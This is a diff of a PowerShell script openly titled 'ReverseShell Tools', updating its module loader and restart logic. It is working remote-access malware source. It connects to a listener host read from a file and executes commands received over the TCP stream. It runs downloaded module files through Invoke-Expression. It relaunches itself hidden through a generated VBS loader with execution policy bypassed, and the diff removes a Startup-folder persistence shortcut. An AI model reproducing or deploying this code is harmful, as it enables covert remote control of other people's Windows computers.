@@ -1,4 +1,4 @@
-#1.1
+#1.2
 
 try { Get-Content -Path ((Get-Item $PSCommandPath).DirectoryName + "\listener.txt") -ErrorAction Stop | ForEach-Object { $server = $_ } }
 catch
@@ -44,10 +44,20 @@ function WriteTCPMessage ([string]$String, [switch]$NoCommand, [switch]$NoNewLin
 	Write-Host $String
 }
 
+WriteTCPMessage "
+      _____       __  _______ 
+     |  __ \     / / |__   __|
+     | |__) |   / /_    | |   
+     |  _  /   /_  /    | |   
+     | | \ \    / /     | |   
+     |_|  \_\  /_/      |_|   
+
+ ReverseShell Tools by UltraAlex0
+ " -NoCommand
 #ModuleParser
 
-WriteTCPMessage "[ModuleParser v1.0]" -NoCommand
-WriteTCPMessage "Searching For Modules...`n" -NoCommand
+WriteTCPMessage "[ModuleParser v2.0]" -NoCommand
+WriteTCPMessage "Searching For Modules...`n`n" -NoCommand
 try { $modulelist = Get-ChildItem ("$PSScriptRoot\modules") "*.function" -ErrorAction Stop }
 catch { New-Item -Path $PSScriptRoot -Name "modules" -ItemType "Directory" }
 if ($modulelist -eq $null) { WriteTCPMessage "`nNo Modules Found!`n" }
@@ -55,24 +65,30 @@ else
 {
 	foreach ($module in $modulelist)
 	{
-		$moduleinfo = (Get-Content "$PSScriptRoot\modules\$module" -ReadCount 4 -ErrorAction SilentlyContinue).Replace("#", "") # 0 = loadname, 1 = versioninfo, 2 = prefixes and help, 3 = afterloadcommand
-		$loadname = $moduleinfo[0]
-		$versionname = $moduleinfo[1]
-		$afterload = [array]$afterload + $moduleinfo[3]
-		WriteTCPMessage ("loading $loadname v$versionname...") -NoCommand
+		$moduleinfo = Get-Content "$PSScriptRoot\modules\$module"
+		$loadname = ($moduleinfo | Select-String "#n " | Out-String).Replace("#n ", "").Trim()
+		$versionname = ($moduleinfo | Select-String "#v " | Out-String).Replace("#v ", "").Trim()
+		$afterload += ($moduleinfo | Select-String "#load " | Out-String).Replace("#load ", "").Trim()
+		
 		try
 		{
+			if (!([bool]$loadname -and [bool]$versionname)) { Write-Error "" -ErrorAction Stop }
+			WriteTCPMessage ("loading $loadname v$versionname...") -NoCommand -NoNewLine
+			
 			Invoke-Expression ([string](Get-Content "$PSScriptRoot\modules\$module" -Raw)) -ErrorAction Stop
-			$loadedmodules = $loadedmodules + (Invoke-Expression $moduleinfo[2] -ErrorAction Stop)
-			WriteTCPMessage "OK" -NoCommand -NoNewLine
+			foreach ($hStart in ($moduleinfo | Select-String "#hStart ").LineNumber)
+			{
+				$loadedmodules += @{ ($moduleinfo[($hStart - 1)] | Out-String).Replace("#hStart ", "").Trim() = ($moduleinfo[$hStart .. ((($moduleinfo | Select-String "#hEnd").LineNumber | Where-Object { $_ -gt $hStart } | Select-Object -First 1) - 2)]).Replace("#", "") }
+			}
+			WriteTCPMessage "OK`n" -NoCommand -NoNewLine
 		}
-		catch { WriteTCPMessage "Error Parsing Module!" -NoCommand -NoNewLine }
+		catch { WriteTCPMessage "Error Parsing Module!`n" -NoCommand -NoNewLine }
 	}
-	WriteTCPMessage ("`nSucessfully Loaded " + $loadedmodules.Count + " Module(s)!`n") -NoCommand
+	WriteTCPMessage ("Sucessfully Loaded " + $loadedmodules.Count + " Module(s)!`n") -NoCommand
 	
 	$afterload | ForEach-Object { Invoke-Expression $_ }
 }
-Remove-Variable module, moduleinfo, loadname, versionname -ErrorAction SilentlyContinue
+Remove-Variable module, moduleinfo, loadname, versionname, hStart -ErrorAction SilentlyContinue
 
 function RunModule ($Action)
 {
@@ -182,16 +198,8 @@ function RunModule ($Action)
 			$loaderbuilder = 'CreateObject("WScript.Shell").Run "powershell -ExecutionPolicy bypass -file """ & CreateObject("WScript.Shell").CurrentDirectory & "\active.ps1""", 0'
 			New-Item -Path ((Get-Item $PSCommandPath).DirectoryName + "\loader.vbs") -Value $loaderbuilder
 		}
-		try { Get-Item ("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup" + "\loader.lnk") -ErrorAction Stop }
-		catch
-		{
-			$loadershortcutbuilder = (New-Object -ComObject WScript.Shell).CreateShortcut(("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup" + "\loader.lnk"))
-			$loadershortcutbuilder.TargetPath = ((Get-Item $PSCommandPath).DirectoryName + "\loader.vbs")
-			$loadershortcutbuilder.WorkingDirectory = (Get-Item $PSCommandPath).DirectoryName
-			$loadershortcutbuilder.Save()
-		}
-		5 .. 1 | ForEach-Object { WriteTCPMessage "`nRestarting in $_ s" -NoCommand; Start-Sleep 1 }
-		explorer ("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup" + "\loader.lnk")
+		3 .. 1 | ForEach-Object { WriteTCPMessage "`nRestarting in $_ s" -NoCommand; Start-Sleep 1 }
+		wscript "$PSScriptRoot\loader.vbs"
 		exit
 	}
 	
@@ -221,11 +229,11 @@ Internal:
 
 External:
 " -NoCommand
-			WriteTCPMessage ((Invoke-Command { foreach ($moduleindex in $loadedmodules.Keys) { ("`n/" + $moduleindex + " " + $loadedmodules[$moduleindex]) } }) + "`n")
+			WriteTCPMessage ((Invoke-Command { foreach ($moduleindex in $loadedmodules.Keys) { ("`n/" + $moduleindex + " " + ($loadedmodules[$moduleindex].Split("`n") -join "`n") + "`n") } }))
 		}
 		else
 		{
-			try { WriteTCPMessage ("`n/" + $SplitAction[1] + " " + $loadedmodules[$SplitAction[1]] + "`n") }
+			try { WriteTCPMessage ("`n/" + $SplitAction[1] + " " + ($loadedmodules[$SplitAction[1]].Split("`n") -join "`n") + "`n") }
 			catch { WriteTCPMessage "Module Not Found!`n" }
 		}
 	}
@@ -244,8 +252,10 @@ WriteTCPMessage ''
 while (($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0)
 {
 	$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1)
-	try {
+	try
+	{
 		if ($Command.Substring(0, 1) -eq "/") { RunModule $Command.Substring(1) }
+		elseif ($Command -in $loadedmodules.Keys) {WriteTCPMessage "`nRun With '/' As Prefix`n"}
 		else
 		{
 			$Output = try
